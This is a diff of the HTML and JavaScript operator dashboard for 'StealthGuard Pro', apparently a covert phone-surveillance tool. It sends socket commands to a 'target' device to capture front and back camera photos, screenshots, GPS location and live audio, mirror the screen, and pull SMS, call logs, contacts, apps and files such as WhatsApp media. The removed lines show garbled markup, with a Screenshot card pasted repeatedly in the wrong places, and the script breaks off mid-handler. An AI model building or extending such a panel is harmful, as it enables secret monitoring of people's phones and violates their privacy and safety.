@@ -9,383 +9,227 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --primary: #6366f1; --secondary: #1e293b; --accent: #10b981; --bg: #f8fafc; --danger: #ef4444; }
+        :root { --primary: #6366f1; --secondary: #1e293b; --accent: #10b981; --bg: #f1f5f9; --danger: #ef4444; }
         body { background-color: var(--bg); font-family: 'Inter', sans-serif; color: #334155; }
-        .sidebar { height: 100vh; background: var(--secondary); color: white; padding: 1.5rem; position: fixed; width: 260px; box-shadow: 4px 0 10px rgba(0,0,0,0.1); }
-        .main-content { margin-left: 260px; padding: 2rem; }
+        .sidebar { height: 100vh; background: var(--secondary); color: white; padding: 1.5rem; position: fixed; width: 260px; box-shadow: 4px 0 10px rgba(0,0,0,0.1); z-index: 100; }
+        .main-content { margin-left: 260px; padding: 2rem; min-height: 100vh; }
         .nav-link { color: #94a3b8; padding: 12px 18px; border-radius: 10px; margin-bottom: 8px; display: flex; align-items: center; text-decoration: none; cursor: pointer; transition: 0.3s; }
         .nav-link:hover, .nav-link.active { background: rgba(255,255,255,0.1); color: white; transform: translateX(5px); }
         .nav-link i { width: 25px; }
-        .card { border: none; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); background: white; margin-bottom: 1.5rem; }
-        .status-badge { padding: 6px 12px; border-radius: 20px; font-weight: 600; font-size: 0.75rem; letter-spacing: 1px; }
+        .card { border: none; border-radius: 20px; box-shadow: 0 4px 25px rgba(0,0,0,0.05); background: white; margin-bottom: 1.5rem; overflow: hidden; }
+        .card-header { background: white; border-bottom: 1px solid #f1f5f9; padding: 1.5rem; }
+        .status-badge { padding: 8px 16px; border-radius: 20px; font-weight: 700; font-size: 0.75rem; letter-spacing: 1px; }
         .status-online { background: rgba(16,185,129,0.1); color: #10b981; border: 1px solid #10b981; }
         .status-offline { background: rgba(239,68,68,0.1); color: #ef4444; border: 1px solid #ef4444; }
-        #screen-view { width: 100%; border-radius: 12px; background: #000; box-shadow: 0 20px 40px rgba(0,0,0,0.3); border: 4px solid #334155; }
-        .btn-action { border-radius: 10px; padding: 10px; font-weight: 500; transition: 0.2s; }
-        .btn-action:hover { filter: brightness(0.9); transform: scale(1.02); }
-        #log-container { height: 200px; overflow-y: auto; background: #0f172a; color: #38bdf8; padding: 1rem; font-family: 'Fira Code', monospace; font-size: 0.8rem; border-radius: 12px; border: 1px solid #334155; }
-        .data-table thead { background: #f1f5f9; }
-        .data-table th { font-weight: 600; color: #64748b; font-size: 0.8rem; }
-        .file-item { padding: 12px 16px; border-bottom: 1px solid #f1f5f9; cursor: pointer; display: flex; align-items: center; border-radius: 8px; margin: 2px 0; }
-        .file-item:hover { background: #f8fafc; color: var(--primary); }
-        .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 1rem; }
-        .file-card { background: white; border: 1px solid #e2e8f0; border-radius: 12px; padding: 0.75rem; text-align: center; cursor: pointer; transition: 0.2s; position: relative; overflow: hidden; }
-        .file-card:hover { border-color: var(--primary); transform: translateY(-3px); box-shadow: 0 4px 12px rgba(99, 102, 241, 0.1); }
-        .file-thumb-container { width: 100%; height: 100px; border-radius: 8px; margin-bottom: 0.5rem; background: #f1f5f9; display: flex; align-items: center; justify-content: center; overflow: hidden; }
-        .file-thumb-container img { width: 100%; height: 100%; object-fit: cover; }
-        .file-thumb-container i { font-size: 2.5rem; color: #cbd5e1; }
-        .file-name { font-size: 0.8rem; font-weight: 600; color: #334155; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; margin-bottom: 2px; }
-        .file-meta { font-size: 0.65rem; color: #94a3b8; }
-        .breadcrumb { background: #f8fafc; padding: 8px 16px; border-radius: 8px; margin-bottom: 1rem; font-size: 0.85rem; }
-        .breadcrumb-item + .breadcrumb-item::before { content: ">"; }
+        #screen-view { width: 100%; max-width: 400px; border-radius: 12px; background: #000; box-shadow: 0 20px 50px rgba(0,0,0,0.2); border: 8px solid #334155; display: block; margin: 0 auto; }
+        .btn-action { border-radius: 12px; padding: 12px; font-weight: 600; transition: 0.2s; border: none; }
+        .btn-action:hover { filter: brightness(0.9); transform: translateY(-2px); }
+        #log-container { height: 180px; overflow-y: auto; background: #0f172a; color: #38bdf8; padding: 1.2rem; font-family: 'Consolas', monospace; font-size: 0.85rem; border-radius: 15px; }
+        .data-table thead { background: #f8fafc; border-bottom: 2px solid #f1f5f9; }
+        .data-table th { padding: 15px; font-weight: 700; color: #64748b; font-size: 0.8rem; text-transform: uppercase; }
+        .data-table td { padding: 15px; vertical-align: middle; border-bottom: 1px solid #f8fafc; }
+        .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 1.2rem; }
+        .file-card { background: white; border: 1px solid #e2e8f0; border-radius: 15px; padding: 1rem; text-align: center; cursor: pointer; transition: 0.2s; position: relative; }
+        .file-card:hover { border-color: var(--primary); transform: translateY(-5px); box-shadow: 0 10px 20px rgba(99, 102, 241, 0.1); }
+        .file-thumb { width: 100%; height: 110px; border-radius: 10px; margin-bottom: 0.8rem; background: #f1f5f9; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .file-thumb img { width: 100%; height: 100%; object-fit: cover; }
+        .file-thumb i { font-size: 3rem; color: #cbd5e1; }
+        .file-name { font-size: 0.85rem; font-weight: 600; color: #1e293b; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .breadcrumb { background: #f8fafc; padding: 10px 20px; border-radius: 12px; margin-bottom: 1.5rem; }
     </style>
 </head>
 <body>
 
     <div class="sidebar">
         <div class="d-flex align-items-center mb-5 px-3">
-            <i class="fas fa-user-shield fa-2x text-primary me-2"></i>
+            <i class="fas fa-shield-halved fa-2x text-primary me-3"></i>
             <h4 class="mb-0 fw-bold">StealthGuard <span class="text-primary">Pro</span></h4>
         </div>
         <nav>
-            <a class="nav-link active" onclick="showTab('dashboard')"><i class="fas fa-home me-2"></i> Dashboard</a>
+            <a class="nav-link active" onclick="showTab('dashboard')"><i class="fas fa-grid-2 me-2"></i> Dashboard</a>
             <a class="nav-link" onclick="showTab('mirror')"><i class="fas fa-desktop me-2"></i> Live Mirror</a>
             <a class="nav-link" onclick="showTab('notifications')"><i class="fas fa-bell me-2"></i> Notifications</a>
-            <a class="nav-link" onclick="showTab('sms')"><i class="fas fa-sms me-2"></i> SMS Logs</a>
-            <a class="nav-link" onclick="showTab('calls')"><i class="fas fa-phone me-2"></i> Call Logs</a>
-            <a class="nav-link" onclick="showTab('contacts')"><i class="fas fa-address-book me-2"></i> Contacts</a>
-            <a class="nav-link" onclick="showTab('files')"><i class="fas fa-folder me-2"></i> File Explorer</a>
-            <a class="nav-link" onclick="showTab('apps')"><i class="fas fa-th-large me-2"></i> Installed Apps</a>
+            <a class="nav-link" onclick="showTab('sms')"><i class="fas fa-comment-dots me-2"></i> SMS Inbox</a>
+            <a class="nav-link" onclick="showTab('calls')"><i class="fas fa-phone-volume me-2"></i> Call Records</a>
+            <a class="nav-link" onclick="showTab('contacts')"><i class="fas fa-address-book me-2"></i> Phonebook</a>
+            <a class="nav-link" onclick="showTab('files')"><i class="fas fa-folder-open me-2"></i> File Explorer</a>
+            <a class="nav-link" onclick="showTab('apps')"><i class="fas fa-layer-group me-2"></i> App List</a>
         </nav>
         <div class="position-absolute bottom-0 start-0 w-100 p-4">
-            <div id="status-badge" class="status-badge status-offline text-center">OFFLINE</div>
+            <div id="status-badge" class="status-badge status-offline text-center shadow-sm">OFFLINE</div>
         </div>
     </div>
 
     <div class="main-content">
+        <!-- Dashboard Tab -->
         <div id="dashboard" class="tab-pane active">
-            <h2 class="fw-bold mb-4">Quick Controls</h2>
+            <div class="d-flex justify-content-between align-items-center mb-4">
+                <h2 class="fw-bold">Control Center</h2>
+                <button class="btn btn-primary px-4 rounded-pill shadow-sm" onclick="sendCommand('ping')">Refresh Connection</button>
+            </div>
+
             <div class="row g-4 mb-4">
                 <div class="col-md-3">
                     <div class="card p-4 text-center">
                         <i class="fas fa-camera fa-2x text-primary mb-3"></i>
-                        <h6>Front Photo</h6>
+                        <h6>Front Camera</h6>
                         <button class="btn btn-action btn-primary w-100" onclick="sendCommand('take_photo', {camera:'front'})">Capture</button>
-                        <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-mobile-alt fa-2x text-warning mb-3"></i>
-                        <h6>Screenshot</h6>
-                        <button class="btn btn-action btn-warning w-100" onclick="sendCommand('take_screenshot')">Capture Screen</button>
                     </div>
                 </div>
-            </div>
-                    <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-mobile-alt fa-2x text-warning mb-3"></i>
-                        <h6>Screenshot</h6>
-                        <button class="btn btn-action btn-warning w-100" onclick="sendCommand('take_screenshot')">Capture Screen</button>
-                    </div>
-                </div>
-            </div>
                 <div class="col-md-3">
                     <div class="card p-4 text-center">
-                        <i class="fas fa-camera fa-2x text-secondary mb-3"></i>
-                        <h6>Back Photo</h6>
+                        <i class="fas fa-camera-rotate fa-2x text-indigo mb-3"></i>
+                        <h6>Back Camera</h6>
                         <button class="btn btn-action btn-secondary w-100" onclick="sendCommand('take_photo', {camera:'back'})">Capture</button>
-                        <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-mobile-alt fa-2x text-warning mb-3"></i>
-                        <h6>Screenshot</h6>
-                        <button class="btn btn-action btn-warning w-100" onclick="sendCommand('take_screenshot')">Capture Screen</button>
                     </div>
                 </div>
-            </div>
-                    <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-mobile-alt fa-2x text-warning mb-3"></i>
-                        <h6>Screenshot</h6>
-                        <button class="btn btn-action btn-warning w-100" onclick="sendCommand('take_screenshot')">Capture Screen</button>
-                    </div>
-                </div>
-            </div>
                 <div class="col-md-3">
                     <div class="card p-4 text-center">
-                        <i class="fas fa-microphone fa-2x text-danger mb-3"></i>
-                        <h6>Audio Rec</h6>
+                        <i class="fas fa-expand fa-2x text-warning mb-3"></i>
+                        <h6>Screenshot</h6>
+                        <button class="btn btn-action btn-warning w-100" onclick="sendCommand('take_screenshot')">Capture</button>
+                    </div>
+                </div>
+                <div class="col-md-3">
+                    <div class="card p-4 text-center">
+                        <i class="fas fa-location-crosshairs fa-2x text-success mb-3"></i>
+                        <h6>GPS Locate</h6>
+                        <button class="btn btn-action btn-success w-100" onclick="sendCommand('get_location')">Track Now</button>
+                    </div>
+                </div>
+                <div class="col-md-3">
+                    <div class="card p-4 text-center">
+                        <i class="fas fa-microphone-lines fa-2x text-danger mb-3"></i>
+                        <h6>Live Audio</h6>
                         <div class="btn-group w-100">
-                            <button class="btn btn-action btn-danger" onclick="sendCommand('start_record')">Start</button>
-                            <button class="btn btn-action btn-outline-danger" onclick="sendCommand('stop_record')">Stop</button>
-                            <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-mobile-alt fa-2x text-warning mb-3"></i>
-                        <h6>Screenshot</h6>
-                        <button class="btn btn-action btn-warning w-100" onclick="sendCommand('take_screenshot')">Capture Screen</button>
+                            <button class="btn btn-danger btn-action" onclick="sendCommand('start_record')">START</button>
+                            <button class="btn btn-outline-danger btn-action" onclick="sendCommand('stop_record')">STOP</button>
+                        </div>
                     </div>
                 </div>
             </div>
-                        <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-mobile-alt fa-2x text-warning mb-3"></i>
-                        <h6>Screenshot</h6>
-                        <button class="btn btn-action btn-warning w-100" onclick="sendCommand('take_screenshot')">Capture Screen</button>
-                    </div>
-                </div>
-            </div>
-                    <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-mobile-alt fa-2x text-warning mb-3"></i>
-                        <h6>Screenshot</h6>
-                        <button class="btn btn-action btn-warning w-100" onclick="sendCommand('take_screenshot')">Capture Screen</button>
-                    </div>
-                </div>
-            </div>
-                <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-map-marker-alt fa-2x text-success mb-3"></i>
-                        <h6>GPS Tracker</h6>
-                        <button class="btn btn-action btn-success w-100" onclick="sendCommand('get_location')">Locate</button>
-                        <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-mobile-alt fa-2x text-warning mb-3"></i>
-                        <h6>Screenshot</h6>
-                        <button class="btn btn-action btn-warning w-100" onclick="sendCommand('take_screenshot')">Capture Screen</button>
-                    </div>
-                </div>
-            </div>
-                    <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-mobile-alt fa-2x text-warning mb-3"></i>
-                        <h6>Screenshot</h6>
-                        <button class="btn btn-action btn-warning w-100" onclick="sendCommand('take_screenshot')">Capture Screen</button>
-                    </div>
-                </div>
-            </div>
-                <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-mobile-alt fa-2x text-warning mb-3"></i>
-                        <h6>Screenshot</h6>
-                        <button class="btn btn-action btn-warning w-100" onclick="sendCommand('take_screenshot')">Capture Screen</button>
-                    </div>
-                </div>
-            </div>
-            <div class="card p-4">
-                <h6 class="fw-bold text-secondary mb-3"><i class="fas fa-terminal me-2"></i>SYSTEM LIVE LOGS</h6>
-                <div id="log-container"></div>
-                <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-mobile-alt fa-2x text-warning mb-3"></i>
-                        <h6>Screenshot</h6>
-                        <button class="btn btn-action btn-warning w-100" onclick="sendCommand('take_screenshot')">Capture Screen</button>
-                    </div>
-                </div>
-            </div>
-        </div>
 
-        <div id="mirror" class="tab-pane d-none">
-            <div class="d-flex justify-content-between align-items-center mb-4">
-                <h2 class="fw-bold m-0">Live Screen Monitor</h2>
-                <div class="btn-group">
-                    <button class="btn btn-success px-4" onclick="sendCommand('start_mirror')"><i class="fas fa-play me-2"></i>START STREAM</button>
-                    <button class="btn btn-danger px-4" onclick="sendCommand('stop_mirror')"><i class="fas fa-stop me-2"></i>STOP</button>
-                    <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-mobile-alt fa-2x text-warning mb-3"></i>
-                        <h6>Screenshot</h6>
-                        <button class="btn btn-action btn-warning w-100" onclick="sendCommand('take_screenshot')">Capture Screen</button>
-                    </div>
-                </div>
-            </div>
-                <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-mobile-alt fa-2x text-warning mb-3"></i>
-                        <h6>Screenshot</h6>
-                        <button class="btn btn-action btn-warning w-100" onclick="sendCommand('take_screenshot')">Capture Screen</button>
-                    </div>
-                </div>
-            </div>
-            <div class="row justify-content-center">
-                <div class="col-lg-6">
-                    <img id="screen-view" src="" alt="Live Stream Container">
-                    <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-mobile-alt fa-2x text-warning mb-3"></i>
-                        <h6>Screenshot</h6>
-                        <button class="btn btn-action btn-warning w-100" onclick="sendCommand('take_screenshot')">Capture Screen</button>
-                    </div>
-                </div>
-            </div>
-                <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-mobile-alt fa-2x text-warning mb-3"></i>
-                        <h6>Screenshot</h6>
-                        <button class="btn btn-action btn-warning w-100" onclick="sendCommand('take_screenshot')">Capture Screen</button>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <div id="notifications" class="tab-pane d-none">
-            <div class="d-flex justify-content-between mb-4">
-                <h2 class="fw-bold m-0">System Notifications</h2>
-                <button class="btn btn-outline-danger" onclick="document.getElementById('notif-list').innerHTML=''">Clear All</button>
-            </div>
-            <div class="card overflow-hidden">
-                <table class="table data-table mb-0">
-                    <thead>
-                        <tr>
-                            <th>App</th>
-                            <th>Title</th>
-                            <th>Message</th>
-                            <th>Time</th>
-                        </tr>
-                    </thead>
-                    <tbody id="notif-list"></tbody>
-                </table>
-            </div>
-        </div>
-
-        <div id="sms" class="tab-pane d-none">
-            <div class="d-flex justify-content-between mb-4"><h2>SMS Inbox</h2><button class="btn btn-primary" onclick="sendCommand('get_sms')">Refresh</button></div>
-            <div class="card overflow-hidden"><table class="table data-table mb-0"><thead><tr><th>Sender</th><th>Message Content</th><th>Timestamp</th></tr></thead><tbody id="sms-list"></tbody></table></div>
-        </div>
-
-        <div id="calls" class="tab-pane d-none">
-            <div class="d-flex justify-content-between mb-4"><h2>Call Records</h2><button class="btn btn-primary" onclick="sendCommand('get_calls')">Refresh</button></div>
-            <div class="card overflow-hidden"><table class="table data-table mb-0"><thead><tr><th>Number</th><th>Type</th><th>Duration</th></tr></thead><tbody id="calls-list"></tbody></table></div>
-        </div>
-
-        <div id="files" class="tab-pane d-none">
-            <h2 class="fw-bold mb-4">Cloud File Explorer</h2>
             <div class="card">
-                <div class="card-header bg-white p-3">
-                    <div id="breadcrumb-container" class="mb-3">
-                        <nav aria-label="breadcrumb">
-                            <ol class="breadcrumb mb-0" id="file-breadcrumbs"></ol>
-                        </nav>
-                        <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-mobile-alt fa-2x text-warning mb-3"></i>
-                        <h6>Screenshot</h6>
-                        <button class="btn btn-action btn-warning w-100" onclick="sendCommand('take_screenshot')">Capture Screen</button>
+                <div class="card-header"><h6 class="m-0 fw-bold"><i class="fas fa-terminal me-2"></i>System Console</h6></div>
+                <div class="p-4"><div id="log-container"></div></div>
+            </div>
+        </div>
+
+        <!-- Mirror Tab -->
+        <div id="mirror" class="tab-pane d-none">
+            <div class="card">
+                <div class="card-header d-flex justify-content-between align-items-center">
+                    <h5 class="m-0 fw-bold">Live Stream</h5>
+                    <div class="btn-group">
+                        <button class="btn btn-success px-4" onclick="sendCommand('start_mirror')">START STREAM</button>
+                        <button class="btn btn-danger px-4" onclick="sendCommand('stop_mirror')">STOP</button>
                     </div>
                 </div>
+                <div class="p-4"><img id="screen-view" src="" alt="Stream View"></div>
             </div>
-                    <div class="d-flex gap-2">
+        </div>
+
+        <!-- Notifications Tab -->
+        <div id="notifications" class="tab-pane d-none">
+            <div class="card">
+                <div class="card-header d-flex justify-content-between">
+                    <h5 class="m-0 fw-bold">Recent Notifications</h5>
+                    <button class="btn btn-sm btn-outline-danger" onclick="document.getElementById('notif-list').innerHTML=''">Clear Logs</button>
+                </div>
+                <div class="table-responsive">
+                    <table class="table data-table mb-0">
+                        <thead><tr><th>Source App</th><th>Title</th><th>Message Content</th><th>Timestamp</th></tr></thead>
+                        <tbody id="notif-list"></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- SMS Tab -->
+        <div id="sms" class="tab-pane d-none">
+            <div class="card">
+                <div class="card-header d-flex justify-content-between">
+                    <h5 class="m-0 fw-bold">Messages</h5>
+                    <button class="btn btn-sm btn-primary" onclick="sendCommand('get_sms')">Refresh</button>
+                </div>
+                <div class="table-responsive"><table class="table data-table mb-0"><thead><tr><th>Sender</th><th>Body</th><th>Date</th></tr></thead><tbody id="sms-list"></tbody></table></div>
+            </div>
+        </div>
+
+        <!-- Calls Tab -->
+        <div id="calls" class="tab-pane d-none">
+            <div class="card">
+                <div class="card-header d-flex justify-content-between">
+                    <h5 class="m-0 fw-bold">Call History</h5>
+                    <button class="btn btn-sm btn-primary" onclick="sendCommand('get_calls')">Refresh</button>
+                </div>
+                <div class="table-responsive"><table class="table data-table mb-0"><thead><tr><th>Number</th><th>Type</th><th>Duration</th><th>Date</th></tr></thead><tbody id="calls-list"></tbody></table></div>
+            </div>
+        </div>
+
+        <!-- Files Tab -->
+        <div id="files" class="tab-pane d-none">
+            <div class="card">
+                <div class="card-header">
+                    <div id="breadcrumb-container"><ol class="breadcrumb mb-3" id="file-breadcrumbs"></ol></div>
+                    <div class="input-group">
                         <button class="btn btn-outline-secondary" onclick="goBack()"><i class="fas fa-arrow-left"></i></button>
                         <input type="text" id="path-input" class="form-control" value="/sdcard/">
                         <button class="btn btn-primary px-4" onclick="loadFiles()">GO</button>
-                        <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-mobile-alt fa-2x text-warning mb-3"></i>
-                        <h6>Screenshot</h6>
-                        <button class="btn btn-action btn-warning w-100" onclick="sendCommand('take_screenshot')">Capture Screen</button>
                     </div>
                 </div>
-            </div>
-                    <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-mobile-alt fa-2x text-warning mb-3"></i>
-                        <h6>Screenshot</h6>
-                        <button class="btn btn-action btn-warning w-100" onclick="sendCommand('take_screenshot')">Capture Screen</button>
-                    </div>
-                </div>
-            </div>
-                <div id="file-list-container" style="max-height: 600px; overflow-y: auto;" class="p-3">
-                    <div id="file-grid" class="file-grid"></div>
-                    <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-mobile-alt fa-2x text-warning mb-3"></i>
-                        <h6>Screenshot</h6>
-                        <button class="btn btn-action btn-warning w-100" onclick="sendCommand('take_screenshot')">Capture Screen</button>
-                    </div>
-                </div>
-            </div>
-                <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-mobile-alt fa-2x text-warning mb-3"></i>
-                        <h6>Screenshot</h6>
-                        <button class="btn btn-action btn-warning w-100" onclick="sendCommand('take_screenshot')">Capture Screen</button>
-                    </div>
-                </div>
-            </div>
-            <div class="mt-3">
-                <button class="btn btn-sm btn-outline-primary m-1" onclick="browseFolder('/sdcard/DCIM/Camera')">Gallery</button>
-                <button class="btn btn-sm btn-outline-primary m-1" onclick="browseFolder('/sdcard/WhatsApp/Media')">WhatsApp</button>
-                <button class="btn btn-sm btn-outline-primary m-1" onclick="browseFolder('/sdcard/Download')">Downloads</button>
-                <button class="btn btn-sm btn-outline-primary m-1" onclick="browseFolder('/sdcard/Pictures')">Pictures</button>
-                <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-mobile-alt fa-2x text-warning mb-3"></i>
-                        <h6>Screenshot</h6>
-                        <button class="btn btn-action btn-warning w-100" onclick="sendCommand('take_screenshot')">Capture Screen</button>
-                    </div>
-                </div>
+                <div class="p-4" style="max-height: 600px; overflow-y: auto;"><div id="file-grid" class="file-grid"></div></div>
             </div>
         </div>
 
+        <!-- Contacts Tab -->
         <div id="contacts" class="tab-pane d-none">
-            <div class="d-flex justify-content-between mb-4"><h2>Phonebook</h2><button class="btn btn-primary" onclick="sendCommand('get_contacts')">Refresh</button></div>
-            <div class="card overflow-hidden"><table class="table data-table mb-0"><thead><tr><th>Name</th><th>Phone Number</th></tr></thead><tbody id="contacts-list"></tbody></table></div>
+            <div class="card">
+                <div class="card-header d-flex justify-content-between"><h5 class="m-0 fw-bold">Phonebook</h5><button class="btn btn-sm btn-primary" onclick="sendCommand('get_contacts')">Refresh</button></div>
+                <div class="table-responsive"><table class="table data-table mb-0"><thead><tr><th>Name</th><th>Phone Number</th></tr></thead><tbody id="contacts-list"></tbody></table></div>
+            </div>
         </div>
 
+        <!-- Apps Tab -->
         <div id="apps" class="tab-pane d-none">
-            <div class="d-flex justify-content-between mb-4"><h2>Installed Applications</h2><button class="btn btn-primary" onclick="sendCommand('get_apps')">Refresh</button></div>
-            <div class="card"><ul class="list-group list-group-flush" id="apps-list"></ul></div>
+            <div class="card"><div class="card-header d-flex justify-content-between"><h5 class="m-0 fw-bold">Installed Apps</h5><button class="btn btn-sm btn-primary" onclick="sendCommand('get_apps')">Refresh</button></div><div class="list-group list-group-flush" id="apps-list"></div></div>
         </div>
     </div>
 
-    <!-- Screenshot Popup Modal -->
-    <div id="screenshot-modal" class="position-fixed top-0 start-0 w-100 h-100 d-none" style="background: rgba(15,23,42,0.95); z-index: 9999; display: flex; align-items: center; justify-content: center;">
-        <div class="card p-2 text-center" style="max-width: 90vw; border-radius: 20px; overflow: hidden;">
-            <div class="card-header bg-white border-0 d-flex justify-content-between align-items-center p-3">
-                <h6 class="m-0 fw-bold"><i class="fas fa-camera-retro me-2 text-primary"></i>REMOTE SCREENSHOT</h6>
+    <!-- Modals -->
+    <div id="screenshot-modal" class="position-fixed top-0 start-0 w-100 h-100 d-none" style="background: rgba(0,0,0,0.9); z-index: 10000; display: flex; align-items: center; justify-content: center;">
+        <div class="card" style="width: 450px; border-radius: 25px;">
+            <div class="card-header d-flex justify-content-between align-items-center">
+                <h6 class="m-0 fw-bold text-primary">SCREENSHOT CAPTURE</h6>
                 <button class="btn-close" onclick="document.getElementById('screenshot-modal').classList.add('d-none')"></button>
             </div>
-            <div style="max-height: 70vh; overflow-y: auto; background: #eee;">
-                <img id="screenshot-img" src="" style="width: 100%; height: auto;">
-            </div>
+            <div class="p-2"><img id="screenshot-img" src="" style="width: 100%; border-radius: 15px;"></div>
             <div class="p-3 d-flex gap-2">
-                <button class="btn btn-secondary flex-grow-1" onclick="document.getElementById('screenshot-modal').classList.add('d-none')">CLOSE</button>
-                <a id="screenshot-download" href="#" class="btn btn-primary flex-grow-1"><i class="fas fa-download me-2"></i>SAVE IMAGE</a>
+                <button class="btn btn-secondary flex-grow-1 rounded-pill" onclick="document.getElementById('screenshot-modal').classList.add('d-none')">CLOSE</button>
+                <a id="screenshot-download" href="#" class="btn btn-primary flex-grow-1 rounded-pill">DOWNLOAD</a>
             </div>
         </div>
     </div>
 
-    <!-- Professional Popup for Photos -->
-    <div id="image-modal" class="position-fixed top-0 start-0 w-100 h-100 d-none" style="background: rgba(15,23,42,0.95); z-index: 9999; display: flex; align-items: center; justify-content: center;">
+    <div id="image-modal" class="position-fixed top-0 start-0 w-100 h-100 d-none" style="background: rgba(0,0,0,0.9); z-index: 10000; display: flex; align-items: center; justify-content: center;">
         <div class="text-center">
-            <h5 class="text-white mb-3" id="photo-title">REMOTE CAPTURE</h5>
-            <img id="modal-img" src="" style="max-width: 85vw; max-height: 80vh; border-radius: 12px; box-shadow: 0 0 50px rgba(0,0,0,0.5);">
-            <div class="mt-4">
-                <button class="btn btn-light px-5" onclick="closeImg()">CLOSE</button>
-                <a id="download-link" href="#" download="remote_img.jpg" class="btn btn-primary px-5">DOWNLOAD</a>
-                <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-mobile-alt fa-2x text-warning mb-3"></i>
-                        <h6>Screenshot</h6>
-                        <button class="btn btn-action btn-warning w-100" onclick="sendCommand('take_screenshot')">Capture Screen</button>
-                    </div>
-                </div>
+            <h5 class="text-white mb-3" id="photo-title">REMOTE PHOTO</h5>
+            <img id="modal-img" src="" style="max-width: 80vw; max-height: 80vh; border-radius: 20px;">
+            <div class="mt-4 d-flex justify-content-center gap-3">
+                <button class="btn btn-light px-5 rounded-pill" onclick="document.getElementById('image-modal').classList.add('d-none')">CLOSE</button>
+                <a id="download-link" href="#" class="btn btn-primary px-5 rounded-pill">SAVE</a>
             </div>
         </div>
     </div>
 
-    <!-- Audio Popup Modal -->
-    <div id="audio-modal" class="position-fixed top-0 start-0 w-100 h-100 d-none" style="background: rgba(15,23,42,0.95); z-index: 9999; display: flex; align-items: center; justify-content: center;">
-        <div class="card p-4 text-center" style="width: 400px; border-radius: 20px;">
-            <i class="fas fa-microphone-alt fa-3x text-danger mb-3"></i>
-            <h5 class="fw-bold">New Recording Ready</h5>
+    <div id="audio-modal" class="position-fixed top-0 start-0 w-100 h-100 d-none" style="background: rgba(0,0,0,0.9); z-index: 10000; display: flex; align-items: center; justify-content: center;">
+        <div class="card p-4 text-center" style="width: 400px; border-radius: 30px;">
+            <i class="fas fa-microphone-lines fa-3x text-danger mb-3"></i>
+            <h5 class="fw-bold">Recording Ready</h5>
             <audio id="audio-player" controls class="w-100 my-3"></audio>
             <div class="d-flex gap-2">
-                <button class="btn btn-secondary flex-grow-1" onclick="document.getElementById('audio-modal').classList.add('d-none'); document.getElementById('audio-player').pause();">CLOSE</button>
-                <a id="audio-download" href="#" class="btn btn-primary flex-grow-1">DOWNLOAD</a>
-                <div class="col-md-3">
-                    <div class="card p-4 text-center">
-                        <i class="fas fa-mobile-alt fa-2x text-warning mb-3"></i>
-                        <h6>Screenshot</h6>
-                        <button class="btn btn-action btn-warning w-100" onclick="sendCommand('take_screenshot')">Capture Screen</button>
-                    </div>
-                </div>
+                <button class="btn btn-secondary flex-grow-1 rounded-pill" onclick="document.getElementById('audio-modal').classList.add('d-none'); document.getElementById('audio-player').pause();">CLOSE</button>
+                <a id="audio-download" href="#" class="btn btn-primary flex-grow-1 rounded-pill">DOWNLOAD</a>
             </div>
         </div>
     </div>
@@ -395,188 +239,107 @@
         let currentPath = "/sdcard/";
 
         socket.on('device_status', (data) => {
-            const badge = document.getElementById('status-badge');
-            badge.innerText = data.connected ? "ONLINE" : "OFFLINE";
-            badge.className = data.connected ? "status-badge status-online text-center" : "status-badge status-offline text-center";
-            log("System: Connection status updated.");
+            const b = document.getElementById('status-badge');
+            b.innerText = data.connected ? "ONLINE" : "OFFLINE";
+            b.className = `status-badge text-center shadow-sm ${data.connected ? 'status-online' : 'status-offline'}`;
+            log(data.connected ? "Success: Target connected." : "Warning: Target disconnected.");
         });
 
-        socket.on('screen_frame', (data) => {
-            document.getElementById('screen-view').src = 'data:image/jpeg;base64,' + data.image;
-        });
+        socket.on('screen_frame', d => document.getElementById('screen-view').src = 'data:image/jpeg;base64,' + d.image);
 
-        socket.on('child_photo_taken', (data) => {
+        socket.on('child_photo_taken', () => {
             const url = '/captured_photo.jpg?t=' + Date.now();
             document.getElementById('modal-img').src = url;
             document.getElementById('download-link').href = url;
             document.getElementById('image-modal').classList.remove('d-none');
-            log("Camera: New photo received!");
+            log("Camera: New photo received.");
         });
 
-        socket.on('child_sms_list', (data) => {
